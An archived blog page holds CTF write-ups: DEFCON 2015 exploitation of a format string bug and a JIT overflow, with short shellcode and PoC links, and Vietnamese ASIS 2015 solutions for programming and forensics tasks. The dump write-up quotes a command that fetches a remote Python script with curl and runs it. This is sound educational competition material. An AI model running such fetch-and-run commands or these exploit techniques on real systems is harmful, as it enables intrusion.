<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 7) & !(IE 8)]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<title>May | 2015 | BabyPhD CTF Team</title>
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<link rel="pingback" href="https://babyphd.net/xmlrpc.php">
	<!--[if lt IE 9]>
	<script src="https://babyphd.net/wp-content/themes/twentythirteen/js/html5.js"></script>
	<![endif]-->
	<script type='text/javascript'>function ctSetCookie(c_name, value, def_value){document.cookie = c_name + '=' + escape(value) + '; path=/';}ctSetCookie('ct_checkjs', '1181016728', '0');</script><link rel='dns-prefetch' href='https://s0.wp.com/' />
<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
<link rel='dns-prefetch' href='https://s.w.org/' />
<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
<link rel="alternate" type="application/rss+xml" title="BabyPhD CTF Team &raquo; Feed" href="../../feed/index.html" />
<link rel="alternate" type="application/rss+xml" title="BabyPhD CTF Team &raquo; Comments Feed" href="../../comments/feed/index.html" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/babyphd.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.2"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='wp-block-library-css'  href='../../wp-includes/css/dist/block-library/style.min.css%3Fver=5.2.2.css' type='text/css' media='all' />
<link rel='stylesheet' id='twentythirteen-fonts-css'  href='https://fonts.googleapis.com/css?family=Source+Sans+Pro%3A300%2C400%2C700%2C300italic%2C400italic%2C700italic%7CBitter%3A400%2C700&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='genericons-css'  href='../../wp-content/plugins/jetpack/_inc/genericons/genericons/genericons.css%3Fver=3.1.css' type='text/css' media='all' />
<link rel='stylesheet' id='twentythirteen-style-css'  href='../../wp-content/themes/twentythirteen/style.css%3Fver=2013-07-18.css' type='text/css' media='all' />
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentythirteen-ie-css'  href='https://babyphd.net/wp-content/themes/twentythirteen/css/ie.css?ver=2013-07-18' type='text/css' media='all' />
<![endif]-->
<link rel='stylesheet' id='jetpack_css-css'  href='../../wp-content/plugins/jetpack/css/jetpack.css%3Fver=7.5.2.css' type='text/css' media='all' />
<script type='text/javascript' src='../../wp-includes/js/jquery/jquery.js%3Fver=1.12.4-wp'></script>
<script type='text/javascript' src='../../wp-includes/js/jquery/jquery-migrate.min.js%3Fver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ctPublic = {"_ajax_nonce":"a204603c59","_ajax_url":"https:\/\/babyphd.net\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='../../wp-content/plugins/cleantalk-spam-protect/js/apbct-public.min.js%3Fver=5.122'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ctNocache = {"ajaxurl":"https:\/\/babyphd.net\/wp-admin\/admin-ajax.php","info_flag":"","set_cookies_flag":"","blog_home":"https:\/\/babyphd.net\/"};
/* ]]> */
</script>
<script type='text/javascript' src='../../wp-content/plugins/cleantalk-spam-protect/js/cleantalk_nocache.min.js%3Fver=5.122'></script>
<link rel='https://api.w.org/' href='../../wp-json/index.html' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../xmlrpc.php%3Frsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="../../wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.2.2" />

<link rel='dns-prefetch' href='https://v0.wordpress.com/'/>
<link rel='dns-prefetch' href='https://i0.wp.com/'/>
<link rel='dns-prefetch' href='https://i1.wp.com/'/>
<link rel='dns-prefetch' href='https://i2.wp.com/'/>
<style type='text/css'>img#wpstats{display:none}</style>		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
			<style type="text/css" id="twentythirteen-header-css">
			.site-header {
			background: url(../../wp-content/themes/twentythirteen/images/headers/star.png) no-repeat scroll top;
			background-size: 1600px auto;
		}
		@media (max-width: 767px) {
			.site-header {
				background-size: 768px auto;
			}
		}
		@media (max-width: 359px) {
			.site-header {
				background-size: 360px auto;
			}
		}
		</style>
				<style type="text/css" id="wp-custom-css">
				code {
    padding: 2px 4px;
    margin: 0;
    border-radius: 2px;
    color: #222;
    background: #f2f4f5;
}			</style>
		</head>

<body class="archive date sidebar">
	<div id="page" class="hfeed site">
		<header id="masthead" class="site-header" role="banner">
			<a class="home-link" href="../../index.html" title="BabyPhD CTF Team" rel="home">
				<h1 class="site-title">BabyPhD CTF Team</h1>
				<h2 class="site-description">Nói chung đây là một khái niệm vô cùng trừu tượng</h2>
			</a>

			<div id="navbar" class="navbar">
				<nav id="site-navigation" class="navigation main-navigation" role="navigation">
					<button class="menu-toggle">Menu</button>
					<a class="screen-reader-text skip-link" href="index.html#content" title="Skip to content">Skip to content</a>
					<div id="primary-menu" class="nav-menu"><ul>
<li class="page_item page-item-2"><a href="../../ctf-wtf/index.html">CTF</a></li>
</ul></div>
					<form role="search" method="get" class="search-form" action="../../index.html">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form>				</nav><!-- #site-navigation -->
			</div><!-- #navbar -->
		</header><!-- #masthead -->

		<div id="main" class="site-main">

	<div id="primary" class="content-area">
		<div id="content" class="site-content" role="main">

					<header class="archive-header">
				<h1 class="archive-title">Monthly Archives: May 2015</h1>
			</header><!-- .archive-header -->

										
<article id="post-351" class="post-351 post type-post status-publish format-standard hentry category-pwn">
	<header class="entry-header">
		
				<h1 class="entry-title">
			<a href="18/write-up-defcon-ctf-2015-wwtv-cybergrandsandbox/index.html" rel="bookmark">[Write up] DEFCON CTF 2015 - wwtv , cybergrandsandbox</a>
		</h1>
		
		<div class="entry-meta">
			<span class="date"><a href="18/write-up-defcon-ctf-2015-wwtv-cybergrandsandbox/index.html" title="Permalink to [Write up] DEFCON CTF 2015 - wwtv , cybergrandsandbox" rel="bookmark"><time class="entry-date" datetime="2015-05-18T15:29:37+00:00">May 18, 2015</time></a></span><span class="categories-links"><a href="../../category/pwn/index.html" rel="category tag">pwn</a></span><span class="author vcard"><a class="url fn n" href="../../author/peternguyen/index.html" title="View all posts by peternguyen" rel="author">peternguyen</a></span>					</div><!-- .entry-meta -->
	</header><!-- .entry-header -->

		<div class="entry-content">
		<h1><strong>WWTV</strong></h1>
<p>The bug is easy to find at function <strong>Coordidate</strong>, this is <strong>basic format string bug</strong></p>
<p><a href="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.45.12%20PM_zpsv7pq1eki.png"><img src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.45.12%20PM_zpsv7pq1eki.png?resize=604%2C359" alt="" width="604" height="359" data-recalc-dims="1" /></a></p>
<p>But before you enter <strong>printf(s)</strong>, we must to bypass the check a pair float number is parsed from s, to bypass it we just append <strong>format string bug</strong> to the end of the pair '51.492137,-0.192878' , for more information about atof read this http://www.cplusplus.com/reference/cstdlib/atof/</p>
<p>So the payload to exploit this bug too easy:</p>
<ol>
<li>First, we need to leak binary base address, and libc address</li>
<li>Second, calc system address and then overwrite atof got by system address and then pwned.</li>
</ol>
<p>But the game is not over, before we exploit the bug, we need to solve 2 problems:</p>
<p>We must to write a program to solve the game to enter TARDIS mode (this task is to quite strange)</p>
<p>We must bypass timecheck to enter vulnerable function</p>
<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.45.31%20PM_zps5cjo7w5t.png?resize=604%2C401&#038;ssl=1" alt="" width="604" height="401" data-recalc-dims="1" /></p>
<pre class="lang:c decode:true">time_c &gt; 0x55592B6C &amp;&amp; time_c &lt;= 0x55592B7F;</pre>
<p>We must set time_c in range <strong>(0x55592b6c,0x55592b7f]</strong>.</p>
<p>Take a look at <strong>READ_DATA</strong> function , will be triggered after 2 second.</p>
<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.45.50%20PM_zpswdzdbei7.png?resize=604%2C302&#038;ssl=1" alt="" width="604" height="302" data-recalc-dims="1" /></p>
<p>OMG, the buffer was used for saving the connection to localtime server was used to store user input. We just send 9 zero bytes to server and then wait until READ_DATA is triggered and then send 4 bytes in require range, and we will enter vulnerable function.</p>
<p>Our poc here : <a href="https://gist.github.com/peternguyen93/f06aa5e27626598a1c21">https://gist.github.com/peternguyen93/f06aa5e27626598a1c21</a></p>
<h1><strong>CyberGrandSandbox</strong></h1>
<p>This is very interesting challenge.</p>
<p>After doing RE we find some usefull information:</p>
<p>This program implementing basic <strong>Polish Notation </strong>by using JIT compiler.</p>
<p>The structure of jit is:</p>
<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%2010.16.00%20PM_zpsv7mooby2.png?resize=604%2C108&#038;ssl=1" alt="" width="604" height="108" data-recalc-dims="1" /></p>
<p>Take a look at function <strong>handle_digit </strong></p>
<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/Screen%20Shot%202015-05-18%20at%209.52.13%20PM_zpsyqmu8oxb.png?resize=604%2C329&#038;ssl=1" alt="" width="604" height="329" data-recalc-dims="1" /></p>
<p>When we inputted a string of number is seperated by space character , the<strong> jit compiter</strong> will push it in the <strong>stack_buffer</strong>.</p>
<p>We know that size of <strong>stack_buf</strong> is <strong>0x1000</strong> (located below stack_code), in this function there are no unbound checking if we push the <strong>stack_buf</strong> into stack_code, and so this bug does.</p>
<p>We just write own shellcode and then overwrite some opcode in the end of asm_code with own shellcode  (because cgc executable is not have sys_execve syscall so we just use some syscall provided by CGC to read the flag).</p>
<p>Our shellcode :</p>
<pre class="lang:asm decode:true ">_start:
	push 0x3
	pop eax
	push ebx
	pop ecx
	push 0x3
	pop ebx
	push 0x50
	pop edx ;ebx hold my buffer
	int 0x80
	push 0x2
	pop eax
	push 0x1
	pop ebx
	int 0x80</pre>
<p>Our poc is : <a href="https://gist.github.com/peternguyen93/e7d08cf109b38af6baae">https://gist.github.com/peternguyen93/e7d08cf109b38af6baae</a></p>
<p>This is the first time i wrote writeup using english, if something went wrong or some point you dont understand, feel free to ask me above</p>
	</div><!-- .entry-content -->
	
	<footer class="entry-meta">
		
			</footer><!-- .entry-meta -->
</article><!-- #post -->
							
<article id="post-334" class="post-334 post type-post status-publish format-standard hentry category-forensic category-misc category-vietnamese">
	<header class="entry-header">
		
				<h1 class="entry-title">
			<a href="12/asis-quals-ctf-2015-grids-writeup/index.html" rel="bookmark">ASIS Quals CTF 2015 - grids, keka-bomb, dump Writeup</a>
		</h1>
		
		<div class="entry-meta">
			<span class="date"><a href="12/asis-quals-ctf-2015-grids-writeup/index.html" title="Permalink to ASIS Quals CTF 2015 - grids, keka-bomb, dump Writeup" rel="bookmark"><time class="entry-date" datetime="2015-05-12T09:57:45+00:00">May 12, 2015</time></a></span><span class="categories-links"><a href="../../category/forensic/index.html" rel="category tag">forensic</a>, <a href="../../category/misc/index.html" rel="category tag">misc</a>, <a href="../../category/vietnamese/index.html" rel="category tag">vietnamese</a></span><span class="author vcard"><a class="url fn n" href="../../author/gaylord/index.html" title="View all posts by gaylord" rel="author">gaylord</a></span>					</div><!-- .entry-meta -->
	</header><!-- .entry-header -->

		<div class="entry-content">
		<p><strong>Programming 300 - grids</strong></p>
<p>Đề bài nhận được là cho 1 tập hợp điểm trên mặt phẳng 2D, cần tìm diện tích đa giác lớn nhất tạo được mà các đỉnh của đa giác được lấy từ tập hợp điểm đã cho. Dễ thấy là đa giác cần tìm cần bao trọn toàn bộ tập điểm, nên bài toán quy về việc tính diện tích <a href="http://en.wikipedia.org/wiki/Convex_hull">bao lồi</a> của tập điểm này.</p>
<p>Có thể dùng <a href="http://en.wikipedia.org/wiki/Graham_scan">thuật toán quét Graham</a> để tìm bao lồi sau đó dùng <a href="http://en.wikipedia.org/wiki/Shoelace_formula">công thức tính diện tích của Gauss</a> để tính diện tích đa giác vừa tìm được. Nhưng trong SciPy đã có <a href="http://docs.scipy.org/doc/scipy-dev/reference/generated/scipy.spatial.ConvexHull.html">code tìm bao lồi</a> nên mình không cần phải code lại phần bao lồi nữa :))</p>
<p>Code của mình (mình k biết chèn gist vào đây như thế nào :&lt;):</p>
<pre class="font:consolas lang:python decode:true" title="asisctf_grids">from scipy.spatial import ConvexHull
import numpy as np
import ast
import telnetlib
import re
 
class Telnet(telnetlib.Telnet):
    # inherit from Telnetlib and add new method
    def __init__(self,host,port):
        telnetlib.Telnet.__init__(self,host,port)
    # make easier when you want to send raw data to server
    def writeRawData(self,data):
        return self.get_socket().send(data)
 
    def recvRawData(self,size):
        return self.get_socket().recv(size)
 
# Calculate algebraic area of a polygon using shoelace formula
def area(vertices):
    n = len(vertices)
    area = 0.0
    for i in range(n):
        j = (i + 1) % n
        area += vertices[i][0] * vertices[j][1]
        area -= vertices[j][0] * vertices[i][1]
    area /= 2.0
    return area
 
host = '217.218.48.84'
port = 12432
 
# connect
tel = Telnet(host, port)
s = tel.read_until('Are you ready for this challenge?\n')
print s,
# reply
print 'yes'
tel.writeRawData('yes\n')
s = tel.read_until('OK, OK, lets start\n')
print s,
# solve
for i in range(99):
    print '[*] %d-th round' % i
    s = tel.read_until("What's the area?")
    print s,
    l = np.array(ast.literal_eval(re.findall(r'\n(<p style='text-align:center;'><span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_4fd4a56c435d5c26b3c3c366f51b074e.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none;' class='tex' alt="" data-recalc-dims="1" /></span></p>)\n', s)[0]))
    hull = ConvexHull(l)
    vertices = l[hull.vertices]
    res = abs(area(vertices))
    print res
    tel.writeRawData(str(res)+'\n')
# get flag
tel.interact()</pre>
<p>Flag là</p>
<pre>ASIS{f3a8369f4194c5e44c03e5fcefb8ddf6}</pre>
<p><strong>Forensics 75 - Keka Bomb</strong></p>
<p>File đã cho là một file 7z và bên trong nó gồm nhiều file 7z con với dung lượng mỗi file khoảng 4GB : 0009.7z -&gt; 0000007.7z -&gt; 0000000008.7z -&gt; bomb_8, mở file này bằng HxD, tìm chuỗi "ASIS" sẽ thấy flag:</p>
<pre>ASIS{f974da3203d155826974f4a66735a20b}</pre>
<p><strong> Forensics 250 - Dump</strong><br />
File trong đề là 1 file .sav của VirtualBox nhận được khi tạo snapshot hoặc suspend máy ảo. File chỉ chứa một phần RAM đã được sử dụng và được sắp xếp theo một trật tự không nhất định nên (theo quá trình Google của mình) không thể lấy trực tiếp thông tin trên đây được :&lt;, mà cần phải chạy file .sav trên VirtualBox rồi tạo core dump hoặc memdump sau đấy mới phân tích được.</p>
<p>Mình đã tạo một máy ảo VirtualBox với hệ điều hành là Ubuntu x64, để ổ cứng kết nối ở IDE Primary Master, card mạng là Am79C973, RAM là 128MB. Sau đó mình boot máy ảo này, suspend nó, rồi ghi đè file đã cho vào file .sav được VirtualBox tạo ra. Sau đó khi khởi động lại, mình vào được trạng thái đang lưu trong file .sav với hệ điều hành là Tiny Core Linux:</p>
<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?ssl=1"><img data-attachment-id="345" data-permalink="https://babyphd.net/2015/05/12/asis-quals-ctf-2015-grids-writeup/asis_dump/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?fit=1024%2C768&amp;ssl=1" data-orig-size="1024,768" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="asis_dump" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?fit=604%2C453&amp;ssl=1" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?resize=300%2C225&#038;ssl=1" alt="asis_dump" width="300" height="225" class="alignnone size-medium wp-image-345" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/05/asis_dump.png?w=1024&amp;ssl=1 1024w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
<p>Ở trong lịch sử dòng lệnh, có một lệnh là </p>
<pre>python -c "$(curl -fSsL http://a.asis.io/0QnqZU9F)"</pre>
<p>Lệnh này down 1 file .py từ server và thực hiện file này. Mình đã không quan tâm đến nó trong khi đây chính là mấu chốt của bài toán :&lt; (cảm ơn anh @yeuchimse đã chỉ cho em đoạn này :3).</p>
<p>Như vậy có khả năng file Python kia vẫn còn được lưu đâu đó ở trong RAM của máy ảo, vì vậy cần phải đọc được RAM và tìm kiếm đoạn &#039;Please enter the access key&#039; vì khi chương trình được chạy có in ra dòng này. Trong quá trình thi, mình đã chạy VirtualBox trong một máy ảo VMware và dump RAM của máy ảo VMware để tìm trong đó :&lt;. Tuy vậy có một cách đơn giản hơn là dùng HxD hoặc Cheat Engine. Sau khi tìm kiếm với chuỗi: </p>
<pre>'Please enter the access key</pre>
<p>, ta tìm được đoạn code:</p>
<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?ssl=1"><img data-attachment-id="346" data-permalink="https://babyphd.net/2015/05/12/asis-quals-ctf-2015-grids-writeup/memview/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?fit=732%2C626&amp;ssl=1" data-orig-size="732,626" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="memview" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?fit=300%2C257&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?fit=604%2C517&amp;ssl=1" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?resize=300%2C257&#038;ssl=1" alt="memview" width="300" height="257" class="alignnone size-medium wp-image-346" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?resize=300%2C257&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/05/memview.png?w=732&amp;ssl=1 732w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
<p>Đoạn code này yêu cầu nhập 1 chuỗi là key, và nếu key đúng sẽ in ra thứ gì đó. Thử xây dựng lại key từ file code tìm được, sau đó dùng key này để tìm chuỗi in ra:</p>
<pre class="font:consolas lang:python decode:true">import hashlib
 
# calculate key
key_ar = [0 for i in range(5)]
key_ar[0] = hex(58559604012647)[2:].decode('hex')
key_ar[1] = hex(27697077611219024)[2:].decode('hex')
key_ar[2] = hex(28839576914310229)[2:].decode('hex')
key_ar[3] = hex(14469853439423811)[2:].decode('hex')
key_ar[4] = hex(21189029315236706)[2:].decode('hex')
key = '-'.join(key_ar)
 
# original code
# key = raw_input('Please enter the access key: ').strip()
if len(key) == 38:
    key_ar = key.split('-')
    if len(key_ar) == 5:
        if int(key_ar[0].encode('hex'), 16) ==  58559604012647:
            if int(key_ar[1].encode('hex'), 16) == 27697077611219024:
                if int(key_ar[2].encode('hex'), 16) == 28839576914310229:
                    if int(key_ar[3].encode('hex'), 16) == 14469853439423811:
                        if int(key_ar[4].encode('hex'), 16) == 21189029315236706:
                            print key[18] + key[-2] + chr(ord(key[26]) - 1) + key[-2] + '{' + hashlib.md5(key).hexdigest() + '}'
                        else:
                             print 'You access key is not correct! Banned!!'
                    else:
                        print 'You access key is not correct! Banned!!'
                else:
                    print 'You access key is not correct! Banned!!'
            else:
                print 'You access key is not correct! Banned!!'
        else:
            print 'You access key is not correct! Banned!!'
    else:
        print 'You access key is not correct! Banned!!'
else:
    print 'You access key is not correct! Banned!!'</pre>
<p>Sau khi chạy file trên, ta được flag: </p>
<pre>ASIS{632253c69a6049594bc303f0af0042b8}</pre>
	</div><!-- .entry-content -->
	
	<footer class="entry-meta">
		
			</footer><!-- .entry-meta -->
</article><!-- #post -->
			
			
		
		</div><!-- #content -->
	</div><!-- #primary -->

	<div id="tertiary" class="sidebar-container" role="complementary">
		<div class="sidebar-inner">
			<div class="widget-area">
						<aside id="recent-posts-6" class="widget widget_recent_entries">		<h3 class="widget-title">Recent Posts</h3>		<ul>
											<li>
					<a href="../../2018/08/01/meepwn-ctf-2018-meepwn-contract/index.html">MEEPWN CTF 2018 - meepwn contract</a>
									</li>
											<li>
					<a href="../../2018/07/17/meepwn-ctf-2018-xss/index.html">MEEPWN CTF 2018 - XSS</a>
									</li>
											<li>
					<a href="../../2018/07/17/meepwn-ctf-2018-pycalx2/index.html">MEEPWN CTF 2018 - PyCalx2</a>
									</li>
											<li>
					<a href="../../2017/08/10/wtf-is-safefinderoperatormac-campaign/index.html">What is SafeFinder/OperatorMac campaign?</a>
									</li>
											<li>
					<a href="../../2017/07/27/meepwnctf-2017-injection/index.html">MeepwnCTF 2017 - injection</a>
									</li>
					</ul>
		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Recent Comments</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">justcallmedude</span> on <a href="../../2016/11/24/hackyou-ctf-su-2016/index.html#comment-8120">hackyou.ctf.su 2016</a></li><li class="recentcomments"><span class="comment-author-link">zun</span> on <a href="../../2016/11/24/hackyou-ctf-su-2016/index.html#comment-7474">hackyou.ctf.su 2016</a></li><li class="recentcomments"><span class="comment-author-link">Tony</span> on <a href="../../2016/03/12/writeup-for-beginners-bof-vulnerability-lab-syracuse-university/index.html#comment-7218">Writeup for beginners - BoF Vulnerability Lab (Syracuse University)</a></li><li class="recentcomments"><span class="comment-author-link">john</span> on <a href="../../2016/09/11/whitehat-contest-11-pwn400/index.html#comment-7211">Whitehat Contest 12 - Pwn400</a></li><li class="recentcomments"><span class="comment-author-link"><a href='../../index.html' rel='external nofollow' class='url'>chuymichxinhdep</a></span> on <a href="../../2016/09/11/whitehat-contest-11-pwn400/index.html#comment-7210">Whitehat Contest 12 - Pwn400</a></li></ul></aside><aside id="archives-3" class="widget widget_archive"><h3 class="widget-title">Archives</h3>		<ul>
				<li><a href='../../2018/08/index.html'>August 2018</a></li>
	<li><a href='../../2018/07/index.html'>July 2018</a></li>
	<li><a href='../../2017/08/index.html'>August 2017</a></li>
	<li><a href='../../2017/07/index.html'>July 2017</a></li>
	<li><a href='../../2017/05/index.html'>May 2017</a></li>
	<li><a href='../../2016/11/index.html'>November 2016</a></li>
	<li><a href='../../2016/09/index.html'>September 2016</a></li>
	<li><a href='../../2016/07/index.html'>July 2016</a></li>
	<li><a href='../../2016/04/index.html'>April 2016</a></li>
	<li><a href='../../2016/03/index.html'>March 2016</a></li>
	<li><a href='../10/index.html'>October 2015</a></li>
	<li><a href='../09/index.html'>September 2015</a></li>
	<li><a href='index.html'>May 2015</a></li>
	<li><a href='../04/index.html'>April 2015</a></li>
	<li><a href='../02/index.html'>February 2015</a></li>
	<li><a href='../01/index.html'>January 2015</a></li>
		</ul>
			</aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
				<li class="cat-item cat-item-32"><a href="../../category/chuymich/index.html">chuymich</a>
</li>
	<li class="cat-item cat-item-18"><a href="../../category/crypto/index.html">crypto</a>
</li>
	<li class="cat-item cat-item-31"><a href="../../category/forensic/index.html">forensic</a>
</li>
	<li class="cat-item cat-item-15"><a href="../../category/misc/index.html">misc</a>
</li>
	<li class="cat-item cat-item-25"><a href="../../category/pwn/index.html">pwn</a>
</li>
	<li class="cat-item cat-item-4"><a href="../../category/re/index.html">re</a>
</li>
	<li class="cat-item cat-item-38"><a href="../../category/research/index.html">research</a>
</li>
	<li class="cat-item cat-item-47"><a href="../../category/smartcontract/index.html">smartcontract</a>
</li>
	<li class="cat-item cat-item-1"><a href="../../category/uncategorized/index.html">Uncategorized</a>
</li>
	<li class="cat-item cat-item-9"><a href="../../category/vietnamese/index.html">vietnamese</a>
</li>
	<li class="cat-item cat-item-10"><a href="../../category/web/index.html">web</a>
</li>
	<li class="cat-item cat-item-30"><a href="../../category/whitehat/index.html">whitehat</a>
</li>
		</ul>
			</aside><aside id="tag_cloud-3" class="widget widget_tag_cloud"><h3 class="widget-title">Tags</h3><div class="tagcloud"><a href="../../tag/2015/index.html" class="tag-cloud-link tag-link-36 tag-link-position-1" style="font-size: 8pt;" aria-label="2015 (1 item)">2015</a>
<a href="../../tag/babyphd/index.html" class="tag-cloud-link tag-link-35 tag-link-position-2" style="font-size: 8pt;" aria-label="babyphd (1 item)">babyphd</a>
<a href="../../tag/backdoorctf/index.html" class="tag-cloud-link tag-link-33 tag-link-position-3" style="font-size: 8pt;" aria-label="backdoorCTF (1 item)">backdoorCTF</a>
<a href="../../tag/crypto/index.html" class="tag-cloud-link tag-link-14 tag-link-position-4" style="font-size: 22pt;" aria-label="crypto (3 items)">crypto</a>
<a href="../../tag/css/index.html" class="tag-cloud-link tag-link-42 tag-link-position-5" style="font-size: 8pt;" aria-label="css (1 item)">css</a>
<a href="../../tag/gaylord/index.html" class="tag-cloud-link tag-link-34 tag-link-position-6" style="font-size: 8pt;" aria-label="gaylord (1 item)">gaylord</a>
<a href="../../tag/heap/index.html" class="tag-cloud-link tag-link-37 tag-link-position-7" style="font-size: 8pt;" aria-label="heap (1 item)">heap</a>
<a href="../../tag/list-linked/index.html" class="tag-cloud-link tag-link-28 tag-link-position-8" style="font-size: 8pt;" aria-label="list-linked (1 item)">list-linked</a>
<a href="../../tag/malware/index.html" class="tag-cloud-link tag-link-43 tag-link-position-9" style="font-size: 8pt;" aria-label="malware (1 item)">malware</a>
<a href="../../tag/mughthesec/index.html" class="tag-cloud-link tag-link-45 tag-link-position-10" style="font-size: 8pt;" aria-label="Mughthesec (1 item)">Mughthesec</a>
